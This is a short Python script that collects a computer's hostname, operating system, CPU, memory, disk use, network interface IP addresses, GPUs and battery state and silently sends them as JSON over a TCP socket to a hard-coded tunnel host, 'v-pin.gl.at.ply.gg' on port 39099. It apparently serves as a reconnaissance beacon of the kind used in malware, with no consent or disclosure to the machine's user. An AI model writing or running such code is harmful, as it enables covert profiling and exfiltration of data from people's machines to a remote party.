import socket
import json
import platform
import psutil
import subprocess
import sys

HOST = "v-pin.gl.at.ply.gg"  # The server's hostname or IP address
PORT = 39099        # The port used by the server

def get_machine_info():
    # Basic system information
    info = {
        'hostname': platform.node(),
        'architecture': platform.machine(),
        'os': platform.system(),
        'platform': platform.platform(),
        'processor': platform.processor(),
        'ram': f"{psutil.virtual_memory().total / (1024 * 1024)} MB",
        'cpu_count': psutil.cpu_count(),
        'cpu_freq': f"{psutil.cpu_freq()} MHz",
        'disk_usage': psutil.disk_usage('/').percent,  # Adjust path as needed
    }

    # Network information
    try:
        import netifaces
        info['network_interfaces'] = []
        for iface in netifaces.interfaces():
            addrs = netifaces.ifaddresses(iface)
            if netifaces.AF_INET in addrs:
                info['network_interfaces'].append({
                    'interface': iface,
                    'ip': addrs[netifaces.AF_INET][0]['addr']
                })
    except ImportError:
        pass  # netifaces not available

    # GPU information (if available)
    try:
        import GPUtil
        gpus = GPUtil.getGPUs()
        info['gpus'] = [{
            'name': gpu.name,
            'memory': f"{gpu.memoryTotal} MB"
        } for gpu in gpus]
    except ImportError:
        pass  # GPUtil not available

    # Additional system information (customize as needed)
    try:
        info['battery'] = psutil.battery().percent
    except AttributeError:
        pass  # Battery information not available

    return info

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    machine_info = get_machine_info()
    data = json.dumps(machine_info)
    s.sendall(data.encode())
    print("Sent machine information to server")
